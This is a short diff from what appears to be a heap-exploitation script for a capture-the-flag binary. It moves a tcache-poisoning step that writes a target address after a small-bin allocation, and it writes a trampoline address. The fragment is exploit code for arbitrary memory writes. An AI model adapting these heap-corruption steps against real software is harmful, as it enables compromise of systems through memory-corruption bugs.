@@ -42,11 +42,11 @@ for i in range(1, 8):
 #push to unsorted   
 delete(0)
 
-#malloc tcache to write target address
-super(0x78, '0', p64(heap_address) + p64(target_address - 0x10))
-
 #push to small
 create(0x88, '0', '0')
+
+#malloc tcache to write target address
+super(0x78, '0', p64(heap_address) + p64(target_address - 0x10))
 
 #write trampoline address
 edit(0, str(heap_address + 0x400))
